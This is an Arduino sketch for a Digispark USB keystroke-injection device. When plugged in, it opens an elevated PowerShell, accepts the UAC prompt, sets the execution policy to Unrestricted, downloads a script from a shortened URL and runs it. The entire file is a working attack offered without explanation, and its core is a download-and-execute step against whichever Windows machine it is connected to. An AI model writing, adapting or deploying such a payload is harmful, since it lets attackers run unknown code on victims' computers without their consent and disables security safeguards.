#include "DigiKeyboard.h"
void setup() {
  delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(1000);
  DigiKeyboard.print("powershell");
  delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  delay(1000);
  delay(2000);
  DigiKeyboard.sendKeyStroke(43);
  delay(500);
  DigiKeyboard.sendKeyStroke(43);
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(2000);
  DigiKeyboard.println("Set/WinUserLanguageList /LanguageList en/US,es/PE /Force");
  delay(1500);
  DigiKeyboard.println("Set-WinUserLanguageList -LanguageList en-US,es-PE -Force");
  delay(1500);
  DigiKeyboard.println("Set-ExecutionPolicy Unrestricted");
  delay(1000);
  DigiKeyboard.println("s");
  delay(1000);
  DigiKeyboard.print("(new-object net.webclient)");
  delay(300);
  DigiKeyboard.print(".downloadfile('https://acortar.link/6JZZ3b'");
  delay(300);
  DigiKeyboard.print(" ,\"$env:USERPROFILE");
  delay(300);
  DigiKeyboard.println("\\Downloads\\powershellcode.ps1\")");
  delay(2000);
  DigiKeyboard.println("cd $env:USERPROFILE\\Downloads");
  delay(300);
  DigiKeyboard.println("./powershellcode.ps1");
  delay(2000);
}
void loop() {
 
}
